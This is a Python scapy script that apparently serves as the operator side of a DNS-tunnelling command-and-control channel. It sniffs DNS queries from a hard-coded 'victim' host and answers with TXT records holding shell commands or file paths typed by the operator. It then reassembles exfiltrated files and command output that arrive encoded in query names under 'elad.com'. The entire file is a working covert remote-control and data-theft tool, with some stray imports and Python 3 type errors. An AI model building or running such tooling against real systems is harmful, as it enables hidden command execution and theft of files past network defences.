from audioop import add
from curses import OK
from scapy.all import DNS, DNSQR, DNSRR
from scapy.all import *
from scapy.layers.inet import UDP, IP, Ether
from scapy.all import *
import time
import subprocess
from base64 import b64encode
from enum import IntEnum

 
victim_ip = ""
active = False
seqnum = 64
str_to_print = ""
file_buff = bytes(str_to_print)

def printFileHandler(pkt, input_seq,payload, flag):
    global seqnum,str_to_print,file_buff
    if seqnum == input_seq:
        if flag == 2:
            str_to_print += payload
        else :
            file_buff += payload
        seqnum = seqnum + 1
        if seqnum == 255:
            seqnum = 64

    sendDNSRes(pkt, "ok", str(flag))

    
def endFileHandler(pkt, input_seq, payload):
    global file_buff, seqnum
    if input_seq == seqnum:
        filename = input("enter file name: \n")
        file_buff += payload
        seqnum = 64
        with open(filename, "wb") as file:
            file.write(file_buff)
        file_buff = bytes("")
    sendDNSRes(pkt, "ok", "3")


def endPrintHandler(pkt, input_seq,payload):
    global str_to_print , seqnum
    if seqnum == input_seq:
        str_to_print += payload
        seqnum = 64
        print(str_to_print)
        str_to_print = ""

    sendDNSRes(pkt, "ok", "4")
 

def HelloHandler(packet):
    flag_fileOrPrint = input("for file choose 1\nfor print choose 2\n")
    #getting the input for the flag that we send in line 85
    if flag_fileOrPrint == "1":
        res = input("enter file path.\n")
    if flag_fileOrPrint == "2":
        res = input("enter command\n")
    sendDNSRes(packet ,res, flag_fileOrPrint)
 
def sendDNSRes(packet, payload, flag):
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src,
    )
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
    )
    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        rd=0,
        ancount=1,
        an=DNSRR(
            type='TXT',
            rdata=((flag + payload).encode()))
    )
    response_packet = ip / udp / dns
    time.sleep(0.5)
    send(response_packet)

def listenRes():
    while True:
        sniff(filter="udp and src host 10.0.2.4", prn=DNSHandler, timeout=5)

def DNSHandler(pkt):
    global str_to_print, file_buff
    
    fileOrPrint = pkt[0]['DNS'].tc
    
    #if it's a file do not decode - 0 for file
    if fileOrPrint == 0:
        #split the domain from the rest of the payload
        payload = pkt[0]['DNS']['DNSQR'].qname.split(".elad.com".encode())[0]
        # because the data is encoded, deduct 48 for ascii representation
        handle_flag = str(payload[0]-48) 
    else:
        payload = pkt[0]['DNS']['DNSQR'].qname.decode().split(".elad.com")[0]
        handle_flag = payload[0]
    #take seqnum from victim packet
    victimseq = pkt[0]['IP'].ttl
    
        #handl_flag: select file or print, end or not.  
    match handle_flag:
        # 1 for file
        case "1":
            printFileHandler(pkt,victimseq, payload[1:],1)
        # 2 for print
        case "2":
            printFileHandler(pkt, victimseq, payload[1:],2)
        case "4":
            endPrintHandler(pkt, victimseq, payload[1:])
        case "3":
            endFileHandler(pkt, victimseq, payload[1:])
        case "8":
            HelloHandler(pkt)


def main():
    listenRes()
    
if __name__ == "__main__":
    main()
